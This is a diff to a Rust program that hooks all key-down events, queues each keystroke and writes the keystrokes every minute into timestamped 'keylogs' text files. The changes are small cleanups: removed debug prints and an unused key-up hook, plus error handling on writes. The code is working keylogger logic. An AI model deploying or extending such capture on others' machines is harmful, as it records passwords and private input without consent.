@@ -15,17 +15,12 @@ pub fn run(log_dir: &Path) {
 
     let _guard = device_state.on_key_down(move |key| {
         tx.send(key.to_string()).unwrap();
-        //println!("Down: {:#?}", key);
-    });
-
-    let _guard = device_state.on_key_up(|key| {
-        //println!("Up: {:#?}", key);
     });
 
     loop {
 
         thread::sleep(Duration::from_secs(60));
-        
+
         let timestamp_formatted = Local::now().format("%Y-%m-%d-%H:%m:%S");
         let keylog_name = log_dir.join(format!("keylogs-{}.txt", timestamp_formatted));
 
@@ -38,7 +33,7 @@ pub fn run(log_dir: &Path) {
         };
 
         for msg in rx.try_iter() {
-            write!(file, "{}\n",  msg);
+            write!(file, "{}\n",  msg).unwrap();
         }
 
         println!("Written to file");
